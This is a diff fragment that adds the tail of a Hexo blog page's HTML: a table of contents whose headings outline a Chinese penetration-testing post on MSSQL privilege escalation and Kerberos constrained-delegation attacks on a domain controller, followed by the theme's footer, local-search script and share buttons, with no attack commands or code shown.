class="toc-text">6、信息收集加口令加漏洞探针</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E5%86%85%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA-MSSQL-%E6%8F%90%E6%9D%83"><span class="toc-text">攻击域内数据库主机-MSSQL+提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E5%86%85%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">攻击域内域控主机-约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81kekeo%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96sqlserver%E7%9A%84TGT"><span class="toc-text">1、kekeo请求获取sqlserver的TGT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E7%A5%A8%E6%8D%AE%E8%AF%B7%E6%B1%82%E5%9F%9F%E6%8E%A7"><span class="toc-text">2、使用票据请求域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%AF%BC%E5%85%A5%E5%86%85%E5%AD%98"><span class="toc-text">3、导入内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="toc-text">4、连接域控</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E5%85%AB)-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fdc35434a%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/dc35434a/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
